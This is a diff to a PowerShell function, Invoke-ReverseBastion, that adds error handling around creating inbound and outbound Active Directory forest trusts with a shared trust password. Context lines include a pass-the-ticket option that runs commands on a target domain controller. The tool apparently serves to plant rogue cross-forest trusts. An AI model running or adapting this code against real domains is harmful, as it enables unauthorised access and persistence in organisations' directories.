@@ -111,10 +111,29 @@ function Invoke-ReverseBastion {
         netdom trust $CurrentDomain /Verify
     }
 
-    [System.DirectoryServices.ActiveDirectory.Forest]::GetCurrentForest().CreateTrustRelationship(
-        $TargetDomain,
-        [System.DirectoryServices.ActiveDirectory.TrustDirection]::Inbound
-    )
+    try {
+        [System.DirectoryServices.ActiveDirectory.Forest]::GetCurrentForest().CreateTrustRelationship(
+            $TargetDomain,
+            [System.DirectoryServices.ActiveDirectory.TrustDirection]::Inbound
+        )
+    } catch [System.DirectoryServices.ActiveDirectory.ActiveDirectoryObjectExistsException] {
+        Write-Host "Trust relationship already exists; skipping creation"
+    }
+
+    try {
+        [System.DirectoryServices.ActiveDirectory.Forest]::GetCurrentForest().CreateLocalSideOfTrustRelationship(
+            $TargetDomain,
+            [System.DirectoryServices.ActiveDirectory.TrustDirection]::Outbound,
+            $trustpass
+        )
+    } catch [System.DirectoryServices.ActiveDirectory.ActiveDirectoryObjectExistsException] {
+        Write-Host "Local side of trust relationship already exists; updating instead of creating anew"
+        [System.DirectoryServices.ActiveDirectory.Forest]::GetCurrentForest().UpdateLocalSideOfTrustRelationship(
+            $TargetDomain,
+            [System.DirectoryServices.ActiveDirectory.TrustDirection]::Outbound,
+            $trustpass
+        )
+    }
 
     if ($PTT) {
         Invoke-Command -ComputerName $TargetDC -ScriptBlock $block -ArgumentList "-CurrentDomain $CurrentDomain -TargetDomain $TargetDomain -trustpass $trustpass"
